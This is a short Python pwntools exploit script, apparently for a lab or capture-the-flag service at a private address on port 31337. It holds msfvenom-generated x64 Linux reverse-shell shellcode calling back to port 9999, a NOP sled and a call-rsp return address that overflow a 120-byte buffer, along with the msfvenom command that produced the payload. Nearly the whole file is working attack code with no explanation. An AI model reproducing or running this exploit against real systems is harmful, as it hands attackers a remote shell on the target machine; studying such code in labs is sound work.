#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 192.168.34.138 --port 31337
from pwn import *

# context.log_level = 'debug'

host = args.HOST or '192.168.34.138'
port = int(args.PORT or 31337)

def remote(argv=[], *a, **kw):
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    return remote(argv, *a, **kw)


#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start()

#msfvenom --arch x64 --platform linux -p linux/x64/shell_reverse_tcp LHOST=192.168.34.138 LPORT=9999 -b '\x00\x0a\x0d' -f python
buf =  b""
buf += b"\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48\x8d\x05"
buf += b"\xef\xff\xff\xff\x48\xbb\x6e\x91\x68\xd0\x35\x90\x73"
buf += b"\x97\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4"
buf += b"\x04\xb8\x30\x49\x5f\x92\x2c\xfd\x6f\xcf\x67\xd5\x7d"
buf += b"\x07\x3b\x2e\x6c\x91\x4f\xdf\xf5\x38\x51\x1d\x3f\xd9"
buf += b"\xe1\x36\x5f\x80\x29\xfd\x44\xc9\x67\xd5\x5f\x93\x2d"
buf += b"\xdf\x91\x5f\x02\xf1\x6d\x9f\x76\xe2\x98\xfb\x53\x88"
buf += b"\xac\xd8\xc8\xb8\x0c\xf8\x06\xff\x46\xf8\x73\xc4\x26"
buf += b"\x18\x8f\x82\x62\xd8\xfa\x71\x61\x94\x68\xd0\x35\x90"
buf += b"\x73\x97"

callrsp = p64(0x400cfb)

exploit = b'\x90' * (120 - len(buf)) + buf + callrsp

info(io.sendlineafter('=> ', exploit))
